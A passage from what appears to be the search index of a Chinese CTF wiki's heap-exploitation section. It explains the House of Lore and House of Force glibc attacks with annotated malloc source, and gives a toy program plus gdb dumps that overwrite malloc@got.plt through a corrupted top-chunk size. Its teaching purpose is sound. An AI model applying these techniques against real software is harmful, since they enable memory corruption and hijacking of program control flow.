bin \u7684\u6700\u540e\u4e00\u4e2a chunk\n\n        \n// \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002\n\n        \n// \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5\n\n        \nif\n \n((\nvictim\n \n=\n \nlast\n(\nbin\n))\n \n!=\n \nbin\n)\n \n{\n\n            \n// \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002\n\n            \nif\n \n(\nvictim\n \n==\n \n0\n)\n \n/* initialization check */\n\n                \n// \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\n\n                \nmalloc_consolidate\n(\nav\n);\n\n            \n// \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk\n\n            \nelse\n \n{\n\n                \n// \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002\n\n                \nbck\n \n=\n \nvictim\n-\nbk\n;\n\n                \n// \u68c0\u67e5 bck-\nfd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020\n\n                \nif\n \n(\n__glibc_unlikely\n(\nbck\n-\nfd\n \n!=\n \nvictim\n))\n \n{\n\n                    \nerrstr\n \n=\n \nmalloc(): smallbin double linked list corrupted\n;\n\n                    \ngoto\n \nerrout\n;\n\n                \n}\n\n                \n// \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d\n\n                \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nnb\n);\n\n                \n// \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765\n\n                \nbin\n-\nbk\n \n=\n \nbck\n;\n\n                \nbck\n-\nfd\n \n=\n \nbin\n;\n\n                \n// \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7\n\n                \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n \nset_non_main_arena\n(\nvictim\n);\n\n                \n// \u7ec6\u81f4\u7684\u68c0\u67e5\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                \n// \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001\n\n                \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \n// \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n        \n}\n\n    \n}\n\n\n\n\n\n\u4ece\u4e0b\u9762\u7684\u8fd9\u90e8\u5206\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\n\n\n                \n// \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002\n\n                \nbck\n \n=\n \nvictim\n-\nbk\n;\n\n                \n// \u68c0\u67e5 bck-\nfd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020\n\n                \nif\n \n(\n__glibc_unlikely\n(\nbck\n-\nfd\n \n!=\n \nvictim\n))\n \n{\n\n                    \nerrstr\n \n=\n \nmalloc(): smallbin double linked list corrupted\n;\n\n                    \ngoto\n \nerrout\n;\n\n                \n}\n\n                \n// \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d\n\n                \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nnb\n);\n\n                \n// \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765\n\n                \nbin\n-\nbk\n \n=\n \nbck\n;\n\n                \nbck\n-\nfd\n \n=\n \nbin\n;\n\n\n\n\n\n\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u7684 bk \u4e3a\u6211\u4eec\u6307\u5b9a\u5185\u5b58\u5730\u5740\u7684fake chunk\uff0c\u5e76\u4e14\u540c\u65f6\u6ee1\u8db3\u4e4b\u540e\u7684 bck-\nfd != victim \u7684\u68c0\u6d4b\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u5f97 small bin \u7684 bk \u6070\u597d\u4e3a\u6211\u4eec\u6784\u9020\u7684 fake chunk\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u4e0b\u4e00\u6b21\u7533\u8bf7 small bin \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u4f1a\u5206\u914d\u5230\u6307\u5b9a\u4f4d\u7f6e\u7684 fake chunk\u3002\n\n\n\u4f8b\u5b50\n\n\n\u5f85\u8865\u5145\u3002", 
            "title": "House of Lore"
        }, 
        {
            "location": "/pwn/heap/house_of_lore/#house-of-lore", 
            "text": "", 
            "title": "House of Lore"
        }, 
        {
            "location": "/pwn/heap/house_of_lore/#_1", 
            "text": "House of Lore \u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Small Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002  House of Lore \u53ef\u4ee5\u5b9e\u73b0\u5206\u914d\u4efb\u610f\u6307\u5b9a\u4f4d\u7f6e\u7684 chunk\uff0c\u4ece\u800c\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u3002  House of Lore \u5229\u7528\u7684\u524d\u63d0\u662f\u9700\u8981\u63a7\u5236 Small Bin Chunk \u7684 bk \u6307\u9488\uff0c\u5e76\u4e14\u63a7\u5236\u6307\u5b9a\u4f4d\u7f6e chunk \u7684 fd \u6307\u9488\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/house_of_lore/#_2", 
            "text": "\u5982\u679c\u5728 malloc \u7684\u65f6\u5019\uff0c\u7533\u8bf7\u7684\u5185\u5b58\u5757\u5728 small bin \u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6267\u884c\u7684\u6d41\u7a0b\u5982\u4e0b       /*         If a small request, check regular bin.  Since these  smallbins         hold one size each, no searching within bins is necessary.         (For a large request, we need to wait until unsorted chunks are         processed to find best fit. But for small ones, fits are exact         anyway, so we can check now, which is faster.)       */ \n\n     if   ( in_smallbin_range ( nb ))   { \n         // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 \n         idx   =   smallbin_index ( nb ); \n         // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 \n         bin   =   bin_at ( av ,   idx ); \n         // \u5148\u6267\u884c victim= last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \n         // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 \n         // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 \n         if   (( victim   =   last ( bin ))   !=   bin )   { \n             // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 \n             if   ( victim   ==   0 )   /* initialization check */ \n                 // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 \n                 malloc_consolidate ( av ); \n             // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk \n             else   { \n                 // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 \n                 bck   =   victim - bk ; \n                 // \u68c0\u67e5 bck- fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 \n                 if   ( __glibc_unlikely ( bck - fd   !=   victim ))   { \n                     errstr   =   malloc(): smallbin double linked list corrupted ; \n                     goto   errout ; \n                 } \n                 // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d \n                 set_inuse_bit_at_offset ( victim ,   nb ); \n                 // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 \n                 bin - bk   =   bck ; \n                 bck - fd   =   bin ; \n                 // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 \n                 if   ( av   !=   main_arena )   set_non_main_arena ( victim ); \n                 // \u7ec6\u81f4\u7684\u68c0\u67e5 \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 \n                 void   * p   =   chunk2mem ( victim ); \n                 // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             } \n         } \n     }   \u4ece\u4e0b\u9762\u7684\u8fd9\u90e8\u5206\u6211\u4eec\u53ef\u4ee5\u770b\u51fa                   // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 \n                 bck   =   victim - bk ; \n                 // \u68c0\u67e5 bck- fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 \n                 if   ( __glibc_unlikely ( bck - fd   !=   victim ))   { \n                     errstr   =   malloc(): smallbin double linked list corrupted ; \n                     goto   errout ; \n                 } \n                 // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d \n                 set_inuse_bit_at_offset ( victim ,   nb ); \n                 // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 \n                 bin - bk   =   bck ; \n                 bck - fd   =   bin ;   \u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u7684 bk \u4e3a\u6211\u4eec\u6307\u5b9a\u5185\u5b58\u5730\u5740\u7684fake chunk\uff0c\u5e76\u4e14\u540c\u65f6\u6ee1\u8db3\u4e4b\u540e\u7684 bck- fd != victim \u7684\u68c0\u6d4b\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u5f97 small bin \u7684 bk \u6070\u597d\u4e3a\u6211\u4eec\u6784\u9020\u7684 fake chunk\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u4e0b\u4e00\u6b21\u7533\u8bf7 small bin \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u4f1a\u5206\u914d\u5230\u6307\u5b9a\u4f4d\u7f6e\u7684 fake chunk\u3002", 
            "title": "\u57fa\u672c\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/house_of_lore/#_3", 
            "text": "\u5f85\u8865\u5145\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/heap/house_of_force/", 
            "text": "House Of Force\n\n\n\u4ecb\u7ecd\n\n\nHouse Of Force \u5c5e\u4e8e House Of XXX \u7cfb\u5217\u7684\u5229\u7528\u65b9\u6cd5\uff0cHouse Of XXX \u662f 2004 \u5e74\u300aThe Malloc Maleficarum-Glibc Malloc Exploitation Techniques\u300b\u4e2d\u63d0\u51fa\u7684\u4e00\u7cfb\u5217\u9488\u5bf9 glibc \u5806\u5206\u914d\u5668\u7684\u5229\u7528\u65b9\u6cd5\u3002\n\u4f46\u662f\uff0c\u7531\u4e8e\u5e74\u4ee3\u4e45\u8fdc\u300aThe Malloc Maleficarum\u300b\u4e2d\u63d0\u51fa\u7684\u5927\u591a\u6570\u65b9\u6cd5\u4eca\u5929\u90fd\u4e0d\u80fd\u594f\u6548\uff0c\u6211\u4eec\u73b0\u5728\u6240\u6307\u7684 House Of XXX \u5229\u7528\u76f8\u6bd4 2004 \u5e74\u6587\u7ae0\u4e2d\u5199\u7684\u5df2\u6709\u8f83\u5927\u7684\u4e0d\u540c\u3002\u4f46\u662f\u300aThe Malloc Maleficarum\u300b\u4f9d\u7136\u662f\u4e00\u7bc7\u63a8\u8350\u9605\u8bfb\u7684\u6587\u7ae0\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u8bfb\u5230\u5b83\u7684\u539f\u6587\uff1a\n\nhttps://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt\n\n\n\u539f\u7406\n\n\nHouse Of Force \u662f\u4e00\u79cd\u5806\u5229\u7528\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u8bf4 House Of Force \u5fc5\u987b\u5f97\u57fa\u4e8e\u5806\u6f0f\u6d1e\u6765\u8fdb\u884c\u5229\u7528\u3002\u5982\u679c\u4e00\u4e2a\u5806(heap based) \u6f0f\u6d1e\u60f3\u8981\u901a\u8fc7 House Of Force \u65b9\u6cd5\u8fdb\u884c\u5229\u7528\uff0c\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6\uff1a\n\n\n\n\n\u80fd\u591f\u4ee5\u6ea2\u51fa\u7b49\u65b9\u5f0f\u63a7\u5236\u5230 top chunk \u7684 size \u57df\n\n\n\u80fd\u591f\u81ea\u7531\u5730\u63a7\u5236\u5806\u5206\u914d\u5c3a\u5bf8\u7684\u5927\u5c0f\n\n\n\n\nHouse Of Force \u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8e glibc \u5bf9 top chunk \u7684\u5904\u7406\uff0c\u6839\u636e\u524d\u9762\u5806\u6570\u636e\u7ed3\u6784\u90e8\u5206\u7684\u77e5\u8bc6\u6211\u4eec\u5f97\u77e5\uff0c\u8fdb\u884c\u5806\u5206\u914d\u65f6\uff0c\u5982\u679c\u6240\u6709\u7a7a\u95f2\u7684\u5757\u90fd\u65e0\u6cd5\u6ee1\u8db3\u9700\u6c42\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ece top chunk \u4e2d\u5206\u5272\u51fa\u76f8\u5e94\u7684\u5927\u5c0f\u4f5c\u4e3a\u5806\u5757\u7684\u7a7a\u95f4\u3002\n\n\n\u90a3\u4e48\uff0c\u5f53\u4f7f\u7528 top chunk \u5206\u914d\u5806\u5757\u7684 size \u503c\u662f\u7531\u7528\u6237\u63a7\u5236\u7684\u4efb\u610f\u503c\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\u7b54\u6848\u662f\uff0c\u53ef\u4ee5\u4f7f\u5f97 top chunk\u6307\u5411\u6211\u4eec\u671f\u671b\u7684\u4efb\u4f55\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4e00\u6b21\u4efb\u610f\u5730\u5740\u5199\u3002\u7136\u800c\u5728 glibc \u4e2d\uff0c\u4f1a\u5bf9\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u548c top chunk \u73b0\u6709\u7684 size \u8fdb\u884c\u9a8c\u8bc1\n\n// \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\nvictim = av-\ntop;\nsize   = chunksize(victim);\n// \u5982\u679c\u5728\u5206\u5272\u4e4b\u540e\uff0c\u5176\u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002\nif ((unsigned long) (size) \n= (unsigned long) (nb + MINSIZE)) \n{\n    remainder_size = size - nb;\n    remainder      = chunk_at_offset(victim, nb);\n    av-\ntop        = remainder;\n    set_head(victim, nb | PREV_INUSE |\n            (av != \nmain_arena ? NON_MAIN_ARENA : 0));\n    set_head(remainder, remainder_size | PREV_INUSE);\n\n    check_malloced_chunk(av, victim, nb);\n    void *p = chunk2mem(victim);\n    alloc_perturb(p, bytes);\n    return p;\n}\n\n\n\u7136\u800c\uff0c\u5982\u679c\u53ef\u4ee5\u7be1\u6539 size \u4e3a\u4e00\u4e2a\u5f88\u5927\u503c\uff0c\u5c31\u53ef\u4ee5\u8f7b\u677e\u7684\u901a\u8fc7\u8fd9\u4e2a\u9a8c\u8bc1\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u524d\u9762\u8bf4\u7684\u9700\u8981\u4e00\u4e2a\u80fd\u591f\u63a7\u5236top chunk size \u57df\u7684\u6f0f\u6d1e\u3002\n\n\n(unsigned long) (size) \n= (unsigned long) (nb + MINSIZE)\n\n\n\u4e00\u822c\u7684\u505a\u6cd5\u662f\u628a top chunk \u7684 size \u6539\u4e3a-1\uff0c\u56e0\u4e3a\u5728\u8fdb\u884c\u6bd4\u8f83\u65f6\u4f1a\u628a size \u8f6c\u6362\u6210\u65e0\u7b26\u53f7\u6570\uff0c\u56e0\u6b64 -1 \u4e5f\u5c31\u662f\u8bf4unsigned long \u4e2d\u6700\u5927\u7684\u6570\uff0c\u6240\u4ee5\u65e0\u8bba\u5982\u4f55\u90fd\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002\n\n\nremainder      = chunk_at_offset(victim, nb);\nav-\ntop        = remainder;\n\n/* Treat space at ptr + offset as a chunk */\n#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))\n\n\n\u4e4b\u540e\u8fd9\u91cc\u4f1a\u628a top \u6307\u9488\u66f4\u65b0\uff0c\u63a5\u4e0b\u6765\u7684\u5806\u5757\u5c31\u4f1a\u5206\u914d\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u7528\u6237\u53ea\u8981\u63a7\u5236\u4e86\u8fd9\u4e2a\u6307\u9488\u5c31\u76f8\u5f53\u4e8e\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c(write-anything-anywhere)\u3002\n\n\n\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctopchunk\u7684size\u4e5f\u4f1a\u66f4\u65b0\uff0c\u5176\u66f4\u65b0\u7684\u65b9\u6cd5\u5982\u4e0b\n\n\nvictim\n \n=\n \nav\n-\ntop\n;\n\n\nsize\n   \n=\n \nchunksize\n(\nvictim\n);\n\n\nremainder_size\n \n=\n \nsize\n \n-\n \nnb\n;\n\n\nset_head\n(\nremainder\n,\n \nremainder_size\n \n|\n \nPREV_INUSE\n);\n\n\n\n\n\n\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e0b\u6b21\u5728\u6307\u5b9a\u4f4d\u7f6e\u5206\u914d\u5927\u5c0f\u4e3a x \u7684 chunk\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd remainder_size \u4e0d\u5c0f\u4e8e x+ MINSIZE\u3002\n\n\n\u7b80\u5355\u793a\u4f8b1\n\n\n\u5728\u5b66\u4e60\u5b8c HOF \u7684\u539f\u7406\u4e4b\u540e\uff0c\u6211\u4eec\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u8bf4\u660e HOF \u7684\u5229\u7528\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u7684\u76ee\u6807\u662f\u901a\u8fc7HOF\u6765\u7be1\u6539 \nmalloc@got.plt\n \u5b9e\u73b0\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\n\n\nint main()\n{\n    long *ptr,*ptr2;\n    ptr=malloc(0x10);\n    ptr=(long *)(((long)ptr)+24);\n    *ptr=-1;        // \n=== \u8fd9\u91cc\u628atop chunk\u7684size\u57df\u6539\u4e3a0xffffffffffffffff\n    malloc(-4120);  // \n=== \u51cf\u5c0ftop chunk\u6307\u9488\n    malloc(0x10);   // \n=== \u5206\u914d\u5757\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\n}\n\n\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5206\u914d\u4e00\u4e2a 0x10 \u5b57\u8282\u5927\u5c0f\u7684\u5757\n\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== ptr\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 \n=== top chunk\n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\u4e4b\u540e\u628a top chunk \u7684 size \u6539\u4e3a 0xffffffffffffffff\uff0c\u5728\u771f\u6b63\u7684\u9898\u76ee\u4e2d\uff0c\u8fd9\u4e00\u6b65\u53ef\u4ee5\u901a\u8fc7\u5806\u6ea2\u51fa\u7b49\u6f0f\u6d1e\u6765\u5b9e\u73b0\u3002\n\u56e0\u4e3a -1 \u5728\u8865\u7801\u4e2d\u662f\u4ee5 0xffffffffffffffff \u8868\u793a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8d4b\u503c -1 \u5c31\u53ef\u4ee5\u3002\n\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== ptr\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0xffffffffffffffff \n=== top chunk size\u57df\u88ab\u66f4\u6539\n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\u6ce8\u610f\u6b64\u65f6\u7684 top chunk \u4f4d\u7f6e\uff0c\u5f53\u6211\u4eec\u8fdb\u884c\u4e0b\u4e00\u6b21\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u66f4\u6539 top chunk \u7684\u4f4d\u7f6e\u5230\u6211\u4eec\u60f3\u8981\u7684\u5730\u65b9\n\n\n0x7ffff7dd1b20 \nmain_arena\n:    0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30 \nmain_arena+16\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40 \nmain_arena+32\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50 \nmain_arena+48\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60 \nmain_arena+64\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70 \nmain_arena+80\n: 0x0000000000000000  0x0000000000602020 \n=== top chunk\u6b64\u65f6\u4e00\u5207\u6b63\u5e38\n0x7ffff7dd1b80 \nmain_arena+96\n: 0x0000000000000000  0x00007ffff7dd1b78\n\n\n\u63a5\u4e0b\u6765\u6211\u4eec\u6267\u884c\nmalloc(-4120);\n\uff0c-4120\u662f\u600e\u4e48\u5f97\u51fa\u7684\u5462\uff1f\n\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u660e\u786e\u8981\u5199\u5165\u7684\u76ee\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u6211\u7f16\u8bd1\u7a0b\u5e8f\u540e\uff0c0x601020 \u662f \nmalloc@got.plt\n \u7684\u5730\u5740\n\n\n0x601020:   0x00007ffff7a91130 \n=== malloc@got.plt\n\n\n\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u5c06 top chunk \u6307\u5411 0x601010 \u5904\uff0c\u8fd9\u6837\u5f53\u4e0b\u6b21\u518d\u5206\u914d chunk \u65f6\uff0c\u5c31\u53ef\u4ee5\u5206\u914d\u5230 \nmalloc@got.plt\n \u5904\u7684\u5185\u5b58\u4e86\u3002\n\n\n\u4e4b\u540e\u660e\u786e\u5f53\u524d top chunk \u7684\u5730\u5740\uff0c\u6839\u636e\u524d\u9762\u63cf\u8ff0\uff0ctop chunk \u4f4d\u4e8e 0x602020\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u504f\u79fb\u5982\u4e0b\n\n\n0x601010-0x602020=-4112\n\n\n\u6b64\u5916\uff0c\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u7684\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570\u3002\n\n\nvoid\n \n*\n__libc_malloc\n(\nsize_t\n \nbytes\n)\n \n{\n\n\n\n\n\n\u5982\u679c\u60f3\u8981\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u7ecf\u8fc7\u5185\u90e8\u7684 \nchecked_request2size\n\u53ef\u4ee5\u5f97\u5230\u8fd9\u6837\u7684\u5927\u5c0f\uff0c\u5373\n\n\n/*\n\n\n   Check if a request is so large that it would wrap around zero when\n\n\n   padded and aligned. To simplify some other code, the bound is made\n\n\n   low enough so that adding MINSIZE will also not wrap around zero.\n\n\n */\n\n\n\n#define REQUEST_OUT_OF_RANGE(req)                                              \\\n\n\n    ((unsigned long) (req) \n= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))\n\n\n/* pad request bytes into a usable size -- internal version */\n\n\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n\n#define request2size(req)                                                      \\\n\n\n    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \n MINSIZE)                           \\\n\n\n         ? MINSIZE                                                             \\\n\n\n         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \n ~MALLOC_ALIGN_MASK)\n\n\n\n/*  Same, except also perform argument check */\n\n\n\n#define checked_request2size(req, sz)                                          \\\n\n\n    if (REQUEST_OUT_OF_RANGE(req)) {                                           \\\n\n\n        __set_errno(ENOMEM);                                                   \\\n\n\n        return 0;                                                              \\\n\n\n    }                                                                          \\\n\n\n    (sz) = request2size(req);\n\n\n\n\n\n\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u9700\u8981\u7ed5\u8fc7 REQUEST_OUT_OF_RANGE(req) \u8fd9\u4e2a\u68c0\u6d4b\uff0c\u5373\u6211\u4eec\u4f20\u7ed9 malloc \u7684\u503c\u5728\u8d1f\u6570\u8303\u56f4\u5185\uff0c\u4e0d\u5f97\u5927\u4e8e -2 * MINSIZE\uff0c\u8fd9\u4e2a\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u53ef\u4ee5\u6ee1\u8db3\u7684\u3002\n\n\n\u53e6\u4e00\u65b9\u9762\uff0c\u5728\u6ee1\u8db3\u5bf9\u5e94\u7684\u7ea6\u675f\u540e\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 \nrequest2size\n\u6b63\u597d\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \n ~MALLOC_ALIGN_MASK \u6070\u597d\u4e3a-4112\u3002\u9996\u5148\uff0c\u5f88\u663e\u7136\uff0c-4112 \u662f chunk \u5bf9\u9f50\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u9700\u8981\u5c06\u5176\u5206\u522b\u51cf\u53bb SIZE_SZ\uff0cMALLOC_ALIGN_MASK \u5c31\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u9700\u8981\u7533\u8bf7\u7684\u503c\u3002\u5176\u5b9e\u6211\u4eec\u8fd9\u91cc\u53ea\u9700\u8981\u51cf SIZE_SZ \u5c31\u53ef\u4ee5\u4e86\uff0c\u56e0\u4e3a\u591a\u51cf\u7684 MALLOC_ALIGN_MASK \u6700\u540e\u8fd8\u4f1a\u88ab\u5bf9\u9f50\u6389\u3002\u800c\n\u5982\u679c -4112 \u4e0d\u662f MALLOC_ALIGN \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u9700\u8981\u591a\u51cf\u4e00\u4e9b\u4e86\u3002\u5f53\u7136\uff0c\u6211\u4eec\u6700\u597d\u4f7f\u5f97\u5206\u914d\u4e4b\u540e\u5f97\u5230\u7684 chunk \u4e5f\u662f\u5bf9\u9f50\u7684\uff0c\u56e0\u4e3a\u5728\u91ca\u653e\u4e00\u4e2a chunk \u7684\u65f6\u5019\uff0c\u4f1a\u8fdb\u884c\u5bf9\u9f50\u68c0\u67e5\u3002\n\n\n\u56e0\u6b64\uff0c\u6211\u4eec\u5f53\u8c03\u7528\nmalloc(-4120)\n\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u88ab\u62ac\u9ad8\u5230\u6211\u4eec\u60f3\u8981\u7684\u4f4d\u7f6e\n\n\n0x7ffff7dd1b20 \nmain_arena\n:\\   0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30 \nmain_arena+16\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40 \nmain_arena+32\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50 \nmain_arena+48\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60 \nmain_arena+64\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70 \nmain_arena+80\n: 0x0000000000000000  0x0000000000601010 \n=== \u53ef\u4ee5\u89c2\u5bdf\u5230top 